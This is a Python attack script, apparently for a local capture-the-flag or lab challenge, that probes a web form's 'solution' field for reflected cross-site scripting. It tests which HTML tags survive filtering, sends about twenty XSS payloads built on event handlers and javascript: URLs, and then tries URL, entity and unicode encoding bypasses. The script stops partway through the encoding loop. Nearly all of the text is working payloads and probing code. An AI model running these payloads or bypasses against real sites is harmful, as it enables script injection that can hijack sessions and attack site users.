import requests

base_url = "http://127.0.0.1:33202"

print("="*80)
print("FINDING ALLOWED HTML TAGS")
print("="*80)

# Test common HTML tags to see which ones work
test_tags = [
    'div', 'span', 'p', 'a', 'b', 'i', 'u', 'strong', 'em', 'small',
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'blockquote', 'code', 'pre',
    'ul', 'ol', 'li', 'table', 'tr', 'td', 'th', 'thead', 'tbody',
    'form', 'input', 'button', 'select', 'option', 'textarea',
    'label', 'fieldset', 'legend', 'datalist', 'output',
    'img', 'video', 'audio', 'source', 'track', 'canvas',
    'svg', 'math', 'iframe', 'object', 'embed', 'param',
    'details', 'summary', 'dialog', 'menu', 'menuitem'
]

allowed_tags = []

print("\nTesting HTML tags:")
print("Tag       | Allowed")
print("-" * 20)

for tag in test_tags:
    payload = f'<{tag}>TEST</{tag}>'
    data = {'solution': payload}
    try:
        resp = requests.post(f"{base_url}/page", data=data, timeout=5)
        if f'<{tag}>' in resp.text and 'TEST' in resp.text:
            print(f"{tag:<10} | YES")
            allowed_tags.append(tag)
        else:
            print(f"{tag:<10} | NO")
    except:
        print(f"{tag:<10} | ERROR")

print(f"\n[+] Allowed tags: {allowed_tags}")

# Step 2: Test XSS vectors with allowed tags and event handlers
print(f"\n\n{'='*80}")
print("TESTING XSS VECTORS WITH ALLOWED TAGS")
print("="*80)

xss_vectors = []

# Test with div (likely allowed)
xss_vectors.extend([
    ('div onload', '<div onload="alert(document.domain)">XSS</div>'),
    ('div onerror', '<div onerror="alert(document.domain)">XSS</div>'),
    ('div onmouseover', '<div onmouseover="alert(document.domain)">XSS</div>'),
])

# Test with details (details + ontoggle is a known vector)
xss_vectors.extend([
    ('details ontoggle', '<details open ontoggle="alert(document.domain)">XSS</details>'),
])

# Test with math and animation
xss_vectors.extend([
    ('math href', '<math href="javascript:alert(document.domain)">CLICK</math>'),
    ('math xlink', '<math><mi xlink:href="data:x,<script>alert(document.domain)</script>"></math>'),
])

# Test with embed/object
xss_vectors.extend([
    ('embed js', '<embed src="javascript:alert(document.domain)">'),
    ('object js', '<object data="javascript:alert(document.domain)">'),
])

# Test with form
xss_vectors.extend([
    ('form action', '<form action="javascript:alert(document.domain)"><button>CLICK</button></form>'),
])

# Test with anchor
xss_vectors.extend([
    ('a href js', '<a href="javascript:alert(document.domain)">CLICK</a>'),
    ('a onclick', '<a onclick="alert(document.domain)">CLICK</a>'),
])

# Test with button
xss_vectors.extend([
    ('button onclick', '<button onclick="alert(document.domain)">CLICK</button>'),
])

# Test with table related
xss_vectors.extend([
    ('table background', '<table background="javascript:alert(document.domain)"></table>'),
])

# Test with body (if we can inject outside)
xss_vectors.extend([
    ('body onload', '<body onload="alert(document.domain)">'),
])

# Test with input
xss_vectors.extend([
    ('input onfocus', '<input autofocus onfocus="alert(document.domain)">'),
    ('input onblur', '<input onblur="alert(document.domain)">'),
])

# Test with select
xss_vectors.extend([
    ('select onfocus', '<select autofocus onfocus="alert(document.domain)"></select>'),
])

# Test with textarea
xss_vectors.extend([
    ('textarea onfocus', '<textarea autofocus onfocus="alert(document.domain)"></textarea>'),
])

# Test with video/audio
xss_vectors.extend([
    ('video onerror', '<video><source onerror="alert(document.domain)"></video>'),
    ('audio onerror', '<audio><source onerror="alert(document.domain)"></audio>'),
])

print(f"\nTesting {len(xss_vectors)} XSS vectors:")
print("\nVector Name          | Reflected | Likely to Execute")
print("-" * 55)

working_vectors = []
for name, vector in xss_vectors:
    data = {'solution': vector}
    try:
        resp = requests.post(f"{base_url}/page", data=data, timeout=5)
        if vector in resp.text:
            print(f"{name:<20} | YES       | POTENTIAL!")
            working_vectors.append((name, vector))
        else:
            # Check if HTML encoded
            encoded = vector.replace('<', '&lt;').replace('>', '&gt;')
            if encoded in resp.text:
                print(f"{name:<20} | ENCODED   | Safe (encoded)")
            else:
                print(f"{name:<20} | NO        | Filtered")
    except:
        print(f"{name:<20} | ERROR     | Error")

print(f"\n\n{'='*80}")
print("POTENTIAL XSS VECTORS")
print("="*80)

if working_vectors:
    print(f"\nFound {len(working_vectors)} vectors that are reflected unencoded:")
    for name, vector in working_vectors:
        print(f"\n[+] {name}:")
        print(f"    Payload: {vector}")
else:
    print(f"\n[-] No working vectors found yet")

# Step 3: Test bypass with encoding
print(f"\n\n{'='*80}")
print("TESTING ENCODING BYPASSES")
print("="*80)

print("\n[*] Testing if encoding bypasses tag filters...\n")

encoding_tests = [
    ('URL encode', '%3Cdiv%20onload%3D%22alert(1)%22%3EXSS%3C%2Fdiv%3E'),
    ('HTML entity', '&lt;div onload="alert(1)"&gt;XSS&lt;/div&gt;'),
    ('Unicode', '\\u003cdiv onload="alert(1)"\\u003eXSS\\u003c/div\\u003e'),
]

for name, encoded_payload in encoding_tests:
    print(f"\n{name}:")
    print(f"Payload: {encoded_payload}")
    
    data = {'solution': encoded_payload}
    try:
        resp = requests.post(f"{base_url}/page", data=data, timeout=5)
        
        # Check if decoded version appears
        decoded = encoded_payload
        if '%3C' in encoded_payload:  # URL encoded
            import urllib.parse
            decoded = urllib.parse.unquote(encoded_payload)
        elif '\\u003c' in encoded_payload:  # Unicode
            decoded = encoded_payload.encode().decode('unicode_escape')
        elif '&lt;' in encoded_payload:  # HTML entity
            import html
            decoded = html.unescape(encoded_payload)
        
        if decoded in resp.text:
            print(f"[+] DECODED AND REFLECTED! The server decodes this encoding!")
        elif encoded_payload in resp.text:
            print(f"[+] REFLECTED AS-IS (may still execute with proper context)")
        else:
            print(f"[-] Not reflected")
